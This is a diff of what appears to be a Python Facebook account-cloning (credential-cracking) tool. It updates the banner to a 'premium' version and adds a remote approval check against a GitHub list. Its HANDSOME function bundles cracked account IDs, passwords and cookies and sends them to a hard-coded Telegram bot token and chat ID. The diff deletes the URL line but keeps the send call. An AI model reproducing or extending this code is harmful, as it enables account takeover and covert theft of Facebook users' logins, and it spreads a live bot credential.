@@ -30,7 +30,6 @@ def HANDSOME(ids,pas,cookie):
         token = "6967989114:AAEyppwDyUURbGkPUiJUJUC8SEAoQNO8Uaw"
         chatid = "6921807308"
         ok_id =str(ids+"|"+pas+"|"+cookie)
-        url = f"https://api.telegram.org/bot{token}/sendMessage"
         params = {"chat_id": chatid, "text": ok_id}
         requests.get(url, params=params)
     except:
@@ -229,8 +228,8 @@ logo=("""
                                                            
                                                            
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━┓
- ┃𝐀𝐃𝐌𝐈𝐍:HANDSOME             ┃𝐒𝐓𝐀𝐓𝐔𝐒:FREE        ┃
- ┃𝐅𝐁 𝐈𝐃:DI W AS              ┃𝐕𝐄𝐑𝐒𝐈𝐎𝐍:1.3        ┃
+ ┃𝐀𝐃𝐌𝐈𝐍:HANDSOME             ┃𝐒𝐓𝐀𝐓𝐔𝐒: PREMIUM    ┃
+ ┃𝐅𝐁 𝐈𝐃:DI W AS              ┃𝐕𝐄𝐑𝐒𝐈𝐎𝐍:1.4        ┃
  ┣━━━━━━━━━━━━━━━━━━━━━━━━━┳━┻━━━━━━━━━━━━━━━━━━━┫
  ┃𝐆𝐈𝐓𝐇𝐔𝐁:VANDAINA          ┃ 𝐓𝐎𝐎𝐋 : FILE         |
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━┛
@@ -247,6 +246,26 @@ oks=[]
 cps=[]
 pcp=[]
 id=[]
+#-----------------------[ APPROVAL-DEF ]-----------------------#
+def aproval():
+    fresh()
+    uuid = str(os.geteuid())
+    id = "".join(uuid)
+    try:
+        url_apv = requests.get('https://github.com/HANDSOMEXSAMIR/approval.txt/blob/main/Paid.txt').text
+        if id in url_apv:
+            print(f" \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mAPPROVED SUCCESSFUL");time.sleep(3)
+            Main()
+            pass
+        else:
+            print(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mYOUR KEY : AHMEDFARHAN{id}JOBAIDXJARIFXARIYAN')
+            line()
+            print(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFREE TOOLS BUT YOU NEED APPROVAL TO USE THIS TOOLS')
+            line()
+            print(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mMY FACEBOOK LINK CONTACK WITH ME FOR APPROVAL')
+            print(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mLINK : https://www.facebook.com/F4RH9NXXX.COM12')
+    except:pass
+#-----------------------[ END-CODE ]-----------------------#
 def menu():
                         clear()                	
                         print("[1] File cloning")
